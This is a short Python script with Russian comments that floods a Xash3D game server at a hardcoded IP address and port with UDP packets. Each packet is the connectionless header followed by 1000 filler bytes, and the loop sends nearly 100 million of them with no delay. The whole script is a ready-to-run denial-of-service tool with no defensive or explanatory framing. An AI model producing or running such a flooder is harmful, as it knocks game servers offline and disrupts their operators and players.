import socket

# Укажите IP-адрес и порт сервера Xash3D
server_ip = "151.106.5.230"  # Замените на IP вашего сервера
server_port = 27015  # Замените на нужный порт сервера Xash3D

# Бинарные данные для отправки
data = b"\xff\xff\xff\xff" + b"A" * 1000

# Количество запросов для отправки
num_requests = 99999999  # Замените на нужное количество запросов

# Создаем UDP-сокет
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Отправляем запросы
for i in range(num_requests):
    sock.sendto(data, (server_ip, server_port))
    print(f"Запрос {i+1}/{num_requests} отправлен на сервер {server_ip}:{server_port}")

# Закрываем сокет
sock.close()

print(f"{num_requests} запросов отправлено на сервер {server_ip}:{server_port}")
